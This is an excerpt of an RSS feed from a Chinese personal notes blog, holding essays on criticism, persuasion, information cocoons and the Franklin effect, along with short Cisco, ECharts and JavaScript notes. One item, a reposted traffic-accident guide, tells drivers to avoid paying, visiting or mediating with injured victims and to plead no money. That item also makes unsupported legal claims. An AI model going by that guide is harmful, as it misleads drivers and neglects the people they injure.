  以最低的代价（也就是避免自己需要追加投入或做出改变）终止和预防自己因该被事件连累而遭受的持续损失。
  破坏对方的自信，软化对方的立场，使对方变得更易服从自己的安排。
  破坏对方在组织或社会中的地位和影响力，使其失去威胁。
  帮助对方认识到自身的问题，提高达成其自身目标的成功率。
  你要检查一下你自己的批评冲动里包含了哪些诉求，然后对这些诉求做一下梳理。
这些诉求是正当或者不正当撇开不谈，从纯功利的角度来说，首先你要想清楚的问题是——它们是否适合用“批评”这个手段来需求解决？
这个问题没有看上去这么简单——当然，批评是可以在早期起到这些效果的，
但是代价就是一旦作了这些用途，你的批评权就会磨损，多做几次，就会磨损殆尽。
你要充分的意识到，这是一种对批评权的损耗，眼下这件事是否值得用磨损批评权为代价来解决？
你是要把你的批评权用在报复 Ta 考了低分让你丢脸上、用在自我吹嘘、榨取崇拜上，
还是用在劝阻 Ta 和明显危险的人的来往、选择不可持续的职业生涯上？
如果你把批评权用在批评所不该担当的任务上，并且长期这样做，那么你的批评权就会取消。
于是在真正重大而要害的事情上你就会失去批评权——倒不见得你没有说话的权利，只是对方大概率会置若罔闻。
信不信由你——到时候你会发现就那一件事，就足够抵过一切你自认为达成的成就还有余，
以至于使得那些所谓的指正显得微不足道、可悲甚至可笑。
就像教孩子开车，把你的影响力全浪费在了让 Ta 学会了怎么开空调却没有教会 Ta 踩刹车、打方向盘一样。</description>
    </item>
    
    <item>
      <title>为什么人很难被说服</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BA%BA%E5%BE%88%E9%9A%BE%E8%A2%AB%E8%AF%B4%E6%9C%8D/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BA%BA%E5%BE%88%E9%9A%BE%E8%A2%AB%E8%AF%B4%E6%9C%8D/</guid>
      <description>为什么人很难被说服 归根结底一句话：
因为世界上没有任何一个人会轻易地认为自己的思想竟然是错的（无论他是皇帝还是乞丐，不管她是圣徒还是妓女，）。
 有一天，王阳明的弟子问：
“老师，我犯过许多错误，可你为什么不提醒我？”
王阳明反问：
“我没提醒你，你怎么知道自己犯了错误？”
弟子答：
“我学习后才知道。”
王阳明说：
“所以我教导你学习啊。”
弟子有点疑惑：
“我的意思是说，你应该帮助我改正错误。”王阳明笑道：
“你自己的错误，别人怎么改正得了？只有你自己，才能改正自己的错误。”
 其实这个心理，可以用《道德经》里的两句话来概括。
不自是，故彰 一 公元 200 年，中国历史上爆发了一场著名的战役叫“官渡之战”。
最终，曹操以三万兵马击败袁绍十几万大军，从此拉开了历史新序幕。
可是这场战役，不仅袁绍自己后悔不已，就连后世无数的历史学家也为之扼腕痛惜。
为什么？
因为袁绍本来不会失败，如果当初他采纳了田丰提出的“持久战 + 游击战”建议的话。
那么按照常理：
失败后的袁绍一定会痛定思痛，亲自去监狱里给田丰松绑，并且赔礼道歉，重新重用他。
还别说，在“官渡之战”失败后，真就有一个狱卒向田丰提前道喜。
然而，田丰却仰天长叹道：
“他若胜了，我或许能活；可如今败了，我必死无疑。”
果然，袁绍回来的第一件事，就是将田丰“杀人灭口”。
不过，田丰之死虽然可惜，还是很有教育意义的。
起码他临死前的这一叹，就向我们透露了一个人性的天大秘密。
这个秘密就是：
正常人，是不会认错的
什么？让一个人认错真的有这么难？
对！不仅难，而且难于上青天。
二 美国著名的心理学家艾略特·阿伦森为了研究这个现象，还专门写过一本书来探讨。
书的名字就叫《谁会认错》，他在书里收集整理了数不胜数的真实案例：
从总统到平民；从明星到穷人；
上至国会议员，下到企业职工；
无论是高教育的大学教授，还是低文化的街头小贩。
几乎无一例外，全体国民统统都是“死不认错”的代言人。
这究竟是为什么呢？我觉得可以用一些形象的比喻来解释：
因为当一个人承认自己错误的时候，就等于是从大脑中强行卸载掉旧的思维，同时再安装一套新的观念。
而在新旧交替的过程中，往往会引发大脑信息短路，从而造成思想系统的紊乱。
这可并不是我空口无凭，一时臆想，而是有着实实在在的心理学和脑神经学双重依据。
我上面描述的那种现象，在心理学上被称为：认知失调
这个概念是美国社会心理学家利昂·费斯廷格在 1956 年首次在《当预言失灵》一书中提出来的，
因为他发现那些所谓的末日邪教派成员们，有一种不可思议的信仰坚持。
哪怕他们的教主关于地球灭亡的预言失败了，他们也不会认为教主在欺骗。
但是，毕竟这种“预期落空”引发了他们认知上的不协调，那怎么办呢？
指望他们知错就改，回头是岸？公开承认自己蠢？别开玩笑了。
认错这么反人性的事情，世界上从古至今就没有多少人能够做得到。
这里的”认错“是指发自内心的认为自己的思维是错的，不是那种勉强装出来的面子功夫。
所以，基本上所有的信徒为了解决这种认知失调的办法不是承认错误，而是去接受一个新的预言：
外星人已经因为他们的虔诚信仰而饶恕了这个星球。
也就是说：
当人们在遇到一个跟自己认知不匹配的新观念的时候，第一反应不是接受并改正，
而是找出支持旧观念的其他理由，哪怕这个理由荒唐至极。
三 值得一提的是，美国神经科学家德鲁·威斯顿通过核磁共振技术，扫描人类在处理信息时的脑电图表明：
 当人面对令自己认知失调的信息时，大脑主管理性的区域就会突然“断电”，停止工作；</description>
    </item>
    
    <item>
      <title>信息茧房</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E4%BF%A1%E6%81%AF%E8%8C%A7%E6%88%BF/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E4%BF%A1%E6%81%AF%E8%8C%A7%E6%88%BF/</guid>
      <description>信息茧房 由于社交网络和智能推送的发展，在这个信息爆炸的年代，反而让人变得更加闭塞，
而且每个人都在变得更加极端，人与人间的包容性正在变得越来越差。
互联网巨头近乎掌握了控制人心的能力。
因为你所接触的一切网站和 APP，都会在后台计算你的行为，描画你的性格，捕捉你的需求，然后精准推送，并满足你的需求。
从今日头条，到 UC，到各种新闻 APP，甚至知乎，都有着精密的喜好算法，
全天在向你推送你感兴趣的内容，号称千人千面的精准推送，
实则只是让人活在自己喜好的世界里，因为算法只会给你推送你乐意点开的内容。
长此以往，每个人都会只活在自己的世界里，并且以为自己看到的就是整个世界。
知乎上多数年轻人都受过比较良好的教育，向往或者生存在北上广深，希望或者正在互联网 or 金融领域工作，考虑买房或背负房贷。
所以你们日常的关注点自然就在北上广深的生活，在金融工作和互联网工作，在超一线城市的房价，如何成为男神女神&amp;hellip;
所以你们接收到的推送信息往往都只是相关信息，所以你才会有现在中国房价上天，金融互联网高大上，身边都是三观不正的人，
自己长其实是女神/男神的错觉，并且没有人能告诉你你是错的，因为为了引起的你注意，所有的信息都会按照你的喜好的推。
你是皇帝，但确是一个无法接收到真正信息，只能看大臣奏折的皇帝。
你喜欢看情感撕逼，就会一直给你推情感撕逼，你就会觉得这个世界就是这样的，每个人都靠不住，渣男绿茶遍地都是；
你喜欢同性恋，就会一直给你推同性恋，你就会觉得这个世界对于同性恋特别包涵，大家都特别开明，同性恋就是正义；
你喜欢看屌丝逆袭，就会一直给你推毒鸡汤，你就会认为这个世界只要努力就没有办不成的事情。
你喜欢看国富民强，就一直给你推什么虽远必诛，你就会认为我国已经成为世界第一强国，一切事情背后都有一步大棋。
哪怕你喜欢群 P，喜欢 SM，喜欢各种小众文化，喜欢各种反大众常规道德的东西，
算法也会一直给你推送相关的资讯，让你时刻认为自己已经在主流圈里吾道不孤。
&amp;hellip;.无数案例
你喜欢，你觉得，你认为，你见到的，就是整个世界。
很可惜，不是。
为什么每到过年回老家的时候，大家的三观都要被撞一次腰，然后上知乎疯狂提问吐槽求解求同类？
为什么知乎上这么多与三观崩塌有关的问题？
因为当你强制脱离当前环境的时候，你就会发现，这个世界与你看到的不一样，
你认为理所应当的东西，在别人看来就是傻逼，对此你束手无策。
同一个道理，为什么在知乎里的每一个问题讨论下，都会出现那种你完全无法了解无法认可的回答？而且还有很多赞？你觉得不可思议？
因为每个人的成长环境和生存环境都不一样，所以接收到的信息不一样。
为什么这么多“何不食肉糜”的问题与回答？你是不是觉得对方是傻逼？
对方不是傻，只是看不到你看到的东西。
如果你还是单纯认为自己看到的片面的推送的信息就是整个世界，那么这样恶性循环下去，
大概率你会彻底成为一个极端的人并且乐此不疲，
因为你看到的一切都是满足你极端的需求，你看不到反对意见，最终你会成为大脑的国王，
但你的王国非常脆弱，你的王位岌岌可危，因为你的一切，都经不起观点碰撞。
所以在每一次观点碰撞中，你愤怒又惶恐，惶恐又导致更大的愤怒，所以你愈加极端，你愈加容不下异端。
你以为你代表了主流，实际上在主流眼里你可能是盲流，甚至在其他人眼里你是下九流。
大家一定要警惕，这个看似因为互联网发展已经联通的世界，
实际上正在快速分裂成一个个小世界，而这些世界的边界，不在地域上，而在大脑里。
你看到的，只是你潜意识里想看到的。
所谓独立思考，就是让你跳出自己思维边界，俯瞰整个世界。
虽然这个世界可能并不好看。</description>
    </item>
    
    <item>
      <title>喜欢上一个人的本质是什么</title>
      <link>https://note.yxzi.xyz/note/view/bisexual/%E5%96%9C%E6%AC%A2%E4%B8%8A%E4%B8%80%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BB%80%E4%B9%88/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/bisexual/%E5%96%9C%E6%AC%A2%E4%B8%8A%E4%B8%80%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BB%80%E4%B9%88/</guid>
      <description>喜欢上一个人的本质是什么 这世上所有的感情，其实都是一种“富兰克林效应”。
一个人爱上另一个人的根本原因是什么？
是因为对方的外貌？对方的品格？对方的地位？对方的名声？对方的财富？统统都不是！那究竟是为什么呢？
一 先讲一个著名的故事：
二战时期，犹太人遭到德国纳粹的迫害。
有两个犹太兄弟商量着该向谁寻求帮助，二人的意见发生了分歧。
弟弟主张向父亲曾经资助过的一个银行家求助，而且这名银行家曾多次表示有机会一定要报恩。
哥哥则认为，应该向曾经资助他们家族起步的另一位木材商求助。
两人谁也说服不了谁，于是分头行动，从此失去联系。
多年后，由木材商冒死相助逃到日本的哥哥回国寻找弟弟，发现弟弟全家早已惨死在奥斯威辛集中营。
后来哥哥从纳粹档案中找到了举报弟弟藏匿处的电话记录，打电话的人——正是那位银行家。
哥哥仰天长叹：
曾经帮助过你的人，比你所帮助过的人，更可靠。
二 现代的营销学里的有一个非常经典的案例，上个世纪美国有一家吸尘器公司的推销冠军。
他在退休前一天对其他的员工们说：
你们这些笨蛋，推销业务时只会敲开门问：“太太您好！能不能给我三分钟介绍我们公司的一个产品。”
每次话还没说完，“啪”的一声就吃了闭门羹。你说你们这不是赤裸裸的骚扰吗？顾客没报警已经是客气的了。”
于是这些员工们就好奇的地问：“那您是如何向顾客推销的？”
这位退休的老员工回答道：
“我会说，太太您好！我是一个路过的推销员，口渴了。您能不能给我一杯水喝呢？”
于是，我走进顾客的家，先观察一下环境。
然后在顾客给我准备水的时间里，轻描淡写地唠一唠家长里短，然后旁敲侧击地说几句自己所推销的“吸尘器”。
顾客没有压力，自然就会接话。
如此一来，产品推销的成功率可以提高百分之六七十。其他的员工们听了如梦方醒，纷纷给这位老员工鼓掌。
其实这个案例，有一个心理学的名词，叫做：“富兰克林效应。”
这个效应是根据 18 世纪美国的国父之一的本杰明·富兰克林所说的一句话发展而来的。
富兰克林曾说：
相比那些被你帮助过的人，那些曾经帮助过你的人会更愿意再帮你一次。
他为什么会这么说呢？因为他曾经做过一件影响了世界心理学的事情。
这个故事最早是记录在卡耐基的《人性的弱点》一书中，后来在 1993 年，
美国著名的心理学家艾略特·阿伦森，又将这个故事写进了他的《社会心理学》。
故事大体是这样的：
 1736 年，有一天富兰克林在宾夕法尼亚的议院发表演讲。
另一位议员完全反对他的观点，于是也发表了一篇演讲，十分激烈地批评了富兰克林。
富兰克林有点措手不及，但是又想争取这位议员的同意。
怎么办呢？
他无意中打听到这位议员的家里正好有一套非常稀有的图书。
于是他十分恭敬地写了一封信，厚着脸皮向这个议员借书。
没想到这个议员竟然同意了，过了一段时间，富兰克林在还书的同时郑重地表达了谢意。
几天后当他们再次在议会厅见面时，富兰克林是这样描写的：
“他竟然主动跟我打招呼（以前从来没有过），后来我们谈话，他还表示，任何时候都愿意为我效劳。”
从此他们两人化敌为友，终生保持着友谊。
所以后世的心理学家们人得出一个结论：
让别人喜欢你的最好方法不是去帮助他们，而是让他们来帮助你。
这就是著名的“富兰克林”效应的由来。
 三 一个世纪以后，美国的另一位总统林肯就深受“富兰克林效应“的启发。
有一次，林肯准备让一位政敌帮个小忙。
一位议员批评道：“你为什么要试图跟政敌做朋友呢？你应当消灭他们。”
林肯却温和的回答道：“难道我不是在消灭我的敌人吗？特别是当我们变成朋友的时候。”
让一个敌人帮你一个小忙，就能化敌为友，化干戈为玉帛。
这个套路，真的可信吗？真的可行吗？
四 1969 年，心理学家琼•杰克和戴维•兰迪决定亲自上阵，检验一下这个有二百年历史的“富兰克林效应”在 20 世纪是否已经过期。
于是他们安排了一次知识竞赛，让所有的参与者赢了一笔小钱。
竞赛结束后，一名研究人员向其中三分之一的参与者们表示：
“他是用自己的钱来组织的竞赛，现在他没钱了，能否请他们把钱退还给他。“</description>
    </item>
    
    <item>
      <title>开车撞人后怎么处理最理智</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E5%BC%80%E8%BD%A6%E6%92%9E%E4%BA%BA%E5%90%8E%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86%E6%9C%80%E7%90%86%E6%99%BA/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E5%BC%80%E8%BD%A6%E6%92%9E%E4%BA%BA%E5%90%8E%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86%E6%9C%80%E7%90%86%E6%99%BA/</guid>
      <description>开车撞人后怎么处理最理智 一位资深警察的微信，有车的朋友一定要存！(从此理直气壮）
一 出了事故不要害怕，立刻打 110 和保险公司。对方伤重请直接打 120，你留在现场等交警。
二 不要垫付，如果交警要扣车，你就让他扣，所有他需要的资料都给他。
自己步行或者打车上下班，15 个工作日你直接去交警 大队要验车报告。
不给你，你就立刻即刻马上不要迟疑的到交警同一栋办公楼找到一个叫&amp;quot;行政科&amp;quot;的地方提出行政复议。
然后拿着验车报告去提车，停车场 1 分钱都不要给他，拿着验车报告你直接就可以拿车。
如果对方不给你车，你直接打 110，说有人非法扣车，
验车和停车是不要钱的，国家有财拨专门用于这一部分。
而且百分之百这个停车场都不是交警自己的，都是外包的，他们和交警穿的是同一条裤子。
这一部分你要是担心自己的新车扣了以后被损，你就提前自己拍照，然后弄 一个车衣去盖起来。
三 拿到车该上班就上班，不上班你就休息，千万不要紧张，
现在你要做的事情就是不要去医院找打，也不要主动打电话调解，
你等他们联系你，或者交警通知你处理事故，任何关于医院的费用你都说我没钱，请和我的保险公司联系。
如果告我的话，请连我的保险公司一起告，你连面都不用出，保险公司就请非常专业的讼棍帮你打官司，
最后要赔多少，完全不用自己管。
四 现在你要考虑怎么拿回自己的行驶证，经过第三点，
这个时候对方要么接受调解愿意接受交警认责比例，把发票给你，你去报销，然后签字，你拿回行驶证。
若经过第三点，对方不愿意调解，那就告，你放心大胆的开车，有人查你就说有官司在身，行驶证抵押了。
时间一长，要么保险公司答应赔，要么伤者自己接受调解，法院一判下来，
你就可以直接拿判决书去找交警，约对方一起去签字拿回东西。对方不去，你直接找交警，
时间长了不给你行驶证你就去行政科闹一下。
五 修车部分很简单，该修的地方，保险勘探现场的时候会有一张现场单，你拿去 4S，其他他们会搞定。
六 营养部分，误工部分，你不要私下答应，当地有一份很完整的赔偿标准，
对方拿出所有的发票和证明后交警开具调解书，你拿去保险公司都能报，
三不一没有原则 ：不垫付、 不探望 、不调解，没有钱。</description>
    </item>
    
    <item>
      <title>我们渴望的是智慧</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E6%88%91%E4%BB%AC%E6%B8%B4%E6%9C%9B%E7%9A%84%E6%98%AF%E6%99%BA%E6%85%A7/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E6%88%91%E4%BB%AC%E6%B8%B4%E6%9C%9B%E7%9A%84%E6%98%AF%E6%99%BA%E6%85%A7/</guid>
      <description>我们渴望的是智慧 我们渴求的不是知识，而是智慧。
无论读书还是日常生活，都是精神在现实中的映射，
寻找日常生活中的的真实自我，依旧是求道的一部分，
我们渴求的依旧是那种生存性的智慧，是内化于自己之日常生命的反复追问，
而不是将读书与生活割裂，将知识与行动分离。</description>
    </item>
    
    <item>
      <title>时空扭曲</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E6%97%B6%E7%A9%BA%E6%89%AD%E6%9B%B2/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E6%97%B6%E7%A9%BA%E6%89%AD%E6%9B%B2/</guid>
      <description>时空扭曲 这个概念有点玄。
这里说的时空扭曲，指的是主观的时间流逝感觉随着年龄开始加速，而且一发不可收拾。
相信大部分人都有这样的感觉，时间过得越来越快快了。
小学时是一个月一个月过，大学一学期一学期过，工作后就变成了一年一年过，越往上过的越快，
如果你问问你的父母，他们会告诉你十年一眨眼就没了，他们讨论着十几年二十年前的陈年旧事，好像就发生在昨天&amp;hellip;
我很早就开始研究抗衡这种时空扭曲的方法。
我在网上找了一些解释，有一个说法比较有趣：
 五岁的时候人的记忆有五年，这时候过一年，到六岁时，记忆增加了五分之一。
六岁到七岁，记忆增加了六分之一。
七岁到八岁记忆就只增加了七分之一。
以此类推，到了二十岁的时候，过多一年，记忆便只增加二十分之一。
这一年的时光虽然没变，但是参照物变了。
所以大家就感觉时间过得快了。
可能等你六十岁的的时候，过一年记忆只增加六十分之一，那时时间就过得更快了。
 这个说法有一定的道理，如果你仔细回忆一下，会发现童年的课间十分钟休息足够你从楼上跑下去玩儿点什么；
但现在你坐在公司电脑前，才喝了杯热饮，把东西摊开准备干活，啥都没干呢一个小时就没了。
小时候两个月的暑假特别漫长，现在的一个月不就是四个星期，一眨眼就没了。
如果用记忆增量理论来解释，那就说明我们在成年后的工作和生活都是在简单重复，
所以大脑中的“总数据”并没有像儿时那样处在迅猛增长的阶段，大脑处理今天的 24 小时，
只需要动用几年前就已经存好的索引，驾轻就熟，总信息量几乎没有增加，
你主观上感受到的“新东西”当然就少，而体验“新东西”恰恰是放慢主观时间的命门。
套用网络上“舒适区”的说法，要解决时空扭曲的问题，
我们必须走出“熟悉区”，熟悉区是时空黑洞，会不断加速消耗，吞噬你的时间。
如果你走出办公室，去陌生的国度一个月，就会发现这一个月并没有像办公室里那样，星期三过完就差不多能指望星期天了，
而是觉得比在办公室两个星期都要多，这便是对抗时空扭曲的一个例子。
并不是只有旅游才能有这样的效果，你如果在自己身上多试验，会发现能找到很多适用于你个人的手段，
但前提是你要有“摆脱熟悉区”的意识。
因此，我认为只要能掌握了对抗时空扭曲的能力，人就能延长主观生命。</description>
    </item>
    
    <item>
      <title>点菜时人人都说随便点的局面</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E7%82%B9%E8%8F%9C%E6%97%B6%E4%BA%BA%E4%BA%BA%E9%83%BD%E8%AF%B4%E9%9A%8F%E4%BE%BF%E7%82%B9%E7%9A%84%E5%B1%80%E9%9D%A2/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E7%82%B9%E8%8F%9C%E6%97%B6%E4%BA%BA%E4%BA%BA%E9%83%BD%E8%AF%B4%E9%9A%8F%E4%BE%BF%E7%82%B9%E7%9A%84%E5%B1%80%E9%9D%A2/</guid>
      <description>点菜时人人都说随便点的局面 讲真，多年点菜的经验让我明白一点：凡是点菜时说随便的人，其意往往并非是字面意义上的“随便”。
而是告诉你：他们要的不是选择权，而是决定权。
领导们说“随便”，实在是因为点菜这种事是做下属的分内之事，不需要领导亲力亲为；
并不代表着你可以权纲独断，代替领导拍板。
好比说，部门工作上出了问题，负责拿出具体解决方案的人是你，而领导负责在你拿出的 ABCD 解决方案中挑选并拍板。
朋友们说“随便”，实在是因为他们不愿意为点菜这件事耗费脑细胞，不想在密密麻麻的菜单中费神，
他们只是希望可以将一切简化为行和不行两个选项，就像做判断题一样打勾打叉就好。
一言以蔽之，选择恐惧症。他们真的对吃什么不在意吗？点菜前说随便，点好了又反对，这种情况难道你们没有碰到过？
所以，遇到这种点菜说“随便”的领导/长辈/朋友，你的正确做法就是：
将厚厚的一本菜单按照一定次序缩减到数个选项，然后让他们挑选并拍板。
具体步骤   高声叫来服务员，询问：“你们这有什么特色菜？”之后，服务员当着全席报出 ABCDEF 数个选项。此时，若坐主位的领导长辈们插话：“A 不错！”，点 A；若无人插话，则进入第二步。
  对应服务员报出的 ABCDEF 选项，自己斟酌或进一步询问服务员（如问卖的最好的是什么之类），选出两到三个，向主位的领导或长辈询问：“领导/长辈，我觉得这个 A 还有 B 啊 C 啊挺不错的，您觉得呢？”。此时，若坐主位的领导长辈们说：“A 不错！”，点 A；若对方回答：“随便！都行！”，进入第三步。
  继续斟酌缩小范围到一个，对着主位并兼顾全席说：“那就点这个 A 吧，听说这边做得挺好的/卖的挺不错的/蛮有特色的。”。此时，若坐主位的领导长辈们说：“好好好/随便随便/都行都行”或不答言，点 A；若有人异议，则将 A 换成其他，循环此步骤至无人异议。此时，第一道菜点完。
  继续询问服务员：“你们这里主菜/蔬菜/汤/主食有什么推荐没？”重复以上一到三步，将剩余的菜点完。点菜具体类别次序另说，这里不赘述。
  牢记三句话：知情权在全席；选择权在你；决定权在主位。
以上是和领导长辈们，和朋友之间就可轻松一点。
不用叫服务员自己确定选项也行，也可自己做主点一两道。总之，关键点在于：
不断缩小选择范围，让对方只用选择“是”或者“否”，尽量简化对方思考内容，同时给予对方决定权。
这个原则可不仅适用于点菜，凡是在生活工作中扔给你一句“随便”的人，皆可按此原则处理。
人际交往之间，重要的就是要有个能以小见大，见微知著的心。</description>
    </item>
    
    <item>
      <title>Cisco 配置默认网关</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3/</link>
      <pubDate>Wed, 27 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3/</guid>
      <description>配置默认网关 enableconfigure terminalip default-gateway 192.168.10.1 </description>
    </item>
    
    <item>
      <title>Echarts 基本配置</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Wed, 27 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</guid>
      <description>初始化 初始化一个 Echarts 实例，参数是一个 dom，它决定了图表最终呈现的位置。
var myChart = echarts.init(document.getElementById(&amp;#39;main&amp;#39;)); 绘制图表 用一个对象作为配置项，绘制整个图表。
var option = {}; 标题 title: {  text: &amp;#39;运动品牌科技水平&amp;#39;,  //标题文本点击tiao超链接  link: &amp;#39;https://yxzi.xyz/&amp;#39; }, X 轴 xAxis: {  // 轴类型为类目轴  type: &amp;#39;category&amp;#39;,  // 类目轴的类别名称  data: [&amp;#39;李宁&amp;#39;, &amp;#39;安踏&amp;#39;, &amp;#39;匹克&amp;#39;, &amp;#39;迪卡侬&amp;#39;, &amp;#39;耐克&amp;#39;, &amp;#39;阿迪达斯&amp;#39;] }, Y 轴 yAxis: {  // 轴类型为数值轴，数值轴是不需要设置data属性，  // 因为数值轴针对xAxis的data中的类别名称去series的data中去寻找对应的数据  type: &amp;#39;value&amp;#39;, }, series 一个系列配置。
series: [  {  // 表示下面data中的数据表示的是哪一方面的数据，这里表示的是科技水平  name: &amp;#39;科技水平&amp;#39;,  // 定义图标的类型，这里是柱状图  type: &amp;#39;bar&amp;#39;,  // xAxis 中与类目相对应的数据  data: [22, 15, 12, 15, 80, 40]  }  ] 将配置项设置给 Echarts 实例对象 myChart.</description>
    </item>
    
    <item>
      <title>人对事物的感受程度不一样</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E4%BA%BA%E5%AF%B9%E4%BA%8B%E7%89%A9%E7%9A%84%E6%84%9F%E5%8F%97%E7%A8%8B%E5%BA%A6%E4%B8%8D%E4%B8%80%E6%A0%B7/</link>
      <pubDate>Tue, 26 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E4%BA%BA%E5%AF%B9%E4%BA%8B%E7%89%A9%E7%9A%84%E6%84%9F%E5%8F%97%E7%A8%8B%E5%BA%A6%E4%B8%8D%E4%B8%80%E6%A0%B7/</guid>
      <description>人对事物的感受程度不一样 我从读高中起就一直有一个疑问，就是：不同人对于快乐和痛苦的感受度会否不一样呢？
譬如说同样患有急性肠胃炎，有没有可能一个人的疼痛感是另一个人的 1000 倍呢？
急性肠胃炎带给 A 的痛苦感相当于用刀割肉一般，但对于 B 来说只是如同被捏了一下而已。
如果这是真的，很多成功人士们标榜自己可以承受苦难，其实只是一个他们自己都没有意识到的谎言。
情况也许只是，面对同样的苦，这些成功人士比我们大多数人天生对苦的感受度要低很多而已。
也就是说，那些叫你坚持、叫你努力、叫你吃苦的成功学鸡汤可能卵用都没有，
因为人和人的体质天生不一样，坚持做一件事给 A 带来的苦只是 1 Unit，而给 B 带来的苦却有可能是 1000 Unit。
对于成功人士体质的人来说，早起读书给他们带来的苦只是 1 Unit，对于我们可能是 1000 unit 啊！
所以，怎么能说我们不早起就是意志力薄弱呢！
我一开始以为只有我一个人这样想，后来发现原来早在 1911 年就有一个经济学家和我抱有同样的疑问。
这个经济学家叫斯坦利.耶方斯（Stanley Jevons），他说：
 &amp;hellip;&amp;hellip;在所有的例子中，从来没有人试图把一个心灵中的感觉强度与另一个心灵的感觉强度做比较。
据我们所知，一个心灵的敏感度可能比另一个心灵强 1000 倍。
然而，如果敏感度的差异在各方面上比例相同，则我们将永远无法发现这些差异。
这样，每个人的心灵对于其他任何人来说都是不可测量的，几乎不可能存在一个共同的标准。
 我观察社会，我越发觉得这是极有可能的。
那些努力攀登权力顶峰的人肯定是握有权力给他们带来的快感比我们常人要多 1000 倍，
不然实在想不到为什么有好好的王爷不做，偏要去造反。
再想到学校里的学霸，起早贪黑的学习，肯定是分数带来的快感是我们常人的 1000 倍，而低分带来的痛苦感也是我们的 1000 倍。
令人细思极恐的是：
如果这个猜想是真的，那么每个人的人生都是命定的。
上帝在塑造我们的时候，只需要对不同人的快乐和痛苦两个感受度进行数值上的调整，
那么不同人就会因着不同的感受度而做不同的取舍，最后走上完全不一样的人生。</description>
    </item>
    
    <item>
      <title>没有思想的旅行，行万里路也无异于邮差</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E6%B2%A1%E6%9C%89%E6%80%9D%E6%83%B3%E7%9A%84%E6%97%85%E8%A1%8C%E8%A1%8C%E4%B8%87%E9%87%8C%E8%B7%AF%E4%B9%9F%E6%97%A0%E5%BC%82%E4%BA%8E%E9%82%AE%E5%B7%AE/</link>
      <pubDate>Sun, 24 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E6%B2%A1%E6%9C%89%E6%80%9D%E6%83%B3%E7%9A%84%E6%97%85%E8%A1%8C%E8%A1%8C%E4%B8%87%E9%87%8C%E8%B7%AF%E4%B9%9F%E6%97%A0%E5%BC%82%E4%BA%8E%E9%82%AE%E5%B7%AE/</guid>
      <description>没有思想的旅行，行万里路也无异于邮差 在欧洲旅行，常见的景点之一就是许多古堡和教堂。
首次见到这些景点，大家还会赞叹两句（高大、富丽堂皇之类）。
但等再次遇到这类景点，就会感到索然乏味，很多人甚至是过门而不入。
他们乏味感完全可以理解。
换做我们任何人，没有文化知识的积淀，对历史知识的缺乏。碰到这类景点，估计也是如此，这一点，在国内依然成立。
在国内旅游，任何一个城市，典型的一类景点包括寺庙、石窟、园林、宫殿群。
而要“读懂”这类景点，无不需要历史、宗教、文化等知识积累。
否则要么是任由导游的胡诌乱扯，要么是走马观花之下的乏味。
之后，大部分人所得不过是朋友圈的“摄影大赛”。
而后来和朋友描述此行所得时，不过怅然的感慨“看景不如听景”。
而人要真想提高眼界，首先是阅读和思考，从而形成自己对世界的理解。
而之后的游历，更多的不是增长见识，而是对自己思想的验证。
而在当今，交通和资讯高度发达。
无论是在国内旅游，还是到国外，普通的中产家庭都是能够负担起的。
而与之相比，阅读和思考反而是很多人所匮乏的。
而很多时候，一个爱思考和爱阅读的人甚至不用游历太多，也能拥有深刻的见解。
一个人思考什么远比看见什么重要。
康德终身没有离开过故乡，但这并不妨碍他拥有伟大的思想，成为德国历史上最伟大的哲学家。</description>
    </item>
    
    <item>
      <title>JavaScrip var</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/var/</link>
      <pubDate>Sat, 23 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/var/</guid>
      <description>var 变量会进行函数声明提升，即预编译处理。</description>
    </item>
    
    <item>
      <title>Cisco Rip 协议</title>
